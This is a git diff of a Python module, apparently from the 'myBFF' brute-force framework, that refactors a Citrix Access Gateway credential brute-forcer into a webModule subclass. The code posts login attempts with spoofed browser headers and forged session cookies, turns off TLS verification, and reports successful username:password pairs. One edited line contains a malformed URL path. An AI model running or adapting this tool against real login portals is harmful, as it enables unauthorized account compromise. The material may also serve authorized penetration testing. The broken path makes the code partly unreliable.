@@ -1,17 +1,22 @@
 #! /usr/bin/python
 # Created by Kirk Hayes (l0gan) @kirkphayes
 # Part of myBFF
+from core.webModule import webModule
 from requests import session
 import requests
 import re
 from argparse import ArgumentParser
 
-class citrixbrute():
+class citrixBrute(webModule):
+    def __init__(self, config, display, lock):
+        super(citrixBrute, self).__init__(config, display, lock)
+        self.fingerprint="Citrix Access Gateway"
+        self.response="Success"
     ignore = ['Settings','Log Off']
     def appDetect(self, config, c, cookie1, cookies):
        c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', 'Accept-Language': 'en-US,en;q=0.5'})
        resp1 = c.get(config["HOST"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=False)
-       silentDetect = c.get(config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False)
+       silentDetect = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False)
        cookie2 = silentDetect.cookies['ASP.NET_SessionId']
        cookies2 = dict()
        cookies2['ASP.NET_SessionId'] = cookie2
@@ -19,7 +24,7 @@ class citrixbrute():
        cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
        cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
        cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
-       resp = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False)
+       resp = c.get(config["HOST"] + '/Citrix/ /auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False)
        resp2 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/agesso.aspx', cookies=cookies2, allow_redirects=False, verify=False)
        resp3 = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)
        m = re.search('There are no resources currently available for this user.', resp3.text)
@@ -35,7 +40,7 @@ class citrixbrute():
         with session() as c:
             requests.packages.urllib3.disable_warnings()
             cpost = c.post(config["HOST"] + '/cgi/login', data=payload, allow_redirects=True, verify=False)
-            print cpost.text
+            #print cpost.text
             if "set-cookie': 'N" in str(cpost.headers):
                 print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                 try:
